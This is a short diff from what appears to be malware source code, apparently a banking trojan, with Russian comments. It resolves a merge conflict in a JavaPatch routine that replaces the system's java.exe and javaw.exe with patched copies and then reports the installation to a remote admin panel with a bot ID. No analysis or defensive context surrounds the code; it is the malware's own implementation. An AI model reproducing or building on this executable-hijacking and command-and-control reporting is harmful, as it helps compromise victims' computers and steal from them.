@@ -992,13 +992,8 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				res = FALSE;		
 			}
 			//Подменяем яву
-<<<<<<< HEAD
-			if( ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() ) )
-				if( ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str() ) )
-=======
-			if( ReplacementExe( "java.exe", "javao.exe", javaExe.str(), false ) )
-				if( ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str(), false ) )
->>>>>>> 946d757351e5023880979f335d2be1ff25c867c8
+			if( ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str(), false ) )
+				if( ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str(), false ) )
 				{
 					//сообщаем админке, что ява патч установлен
 					SendLogToAdmin( adminUrl, botUid, "setup_patch", "2" );
